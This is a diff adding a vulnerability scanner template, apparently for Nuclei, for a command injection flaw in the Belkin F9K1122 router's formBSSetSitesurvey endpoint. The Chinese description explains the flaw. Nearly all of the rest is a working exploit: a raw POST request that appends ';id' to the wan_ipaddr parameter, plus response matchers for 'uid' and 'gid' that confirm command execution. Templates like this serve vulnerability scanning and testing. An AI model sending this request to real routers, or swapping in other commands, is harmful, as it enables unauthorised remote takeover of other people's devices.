@@ -1,0 +1,31 @@
+id: belkin-f9k1122-formbssetsitesurvey-rce
+
+info:
+  name: "Belkin F9K1122 路由器 formBSSetSitesurvey 接口命令注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    Belkin F9K1122 路由器的 /goform/formBSSetSitesurvey 接口存在命令注入漏洞。攻击者通过向该接口提交精心构造的HTTP请求，利用未正确验证的 wan_ipaddr、wan_netmask、wan_gateway 及 wl_ssid 参数，将未经过滤的用户输入直接传递至操作系统命令执行层。该缺陷允许远程攻击者在目标系统上执行任意命令，从而完全控制设备。
+
+  tags: Belkin
+
+http:
+- raw:
+  - |
+    POST /goform/formBSSetSitesurvey HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    wan_ipaddr=192.168.1.1;id&wan_netmask=255.255.255.0&wan_gateway=192.168.1.254&wl_ssid=SSID
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'uid'
+  - type: word
+    part: body
+    words:
+    - 'gid'
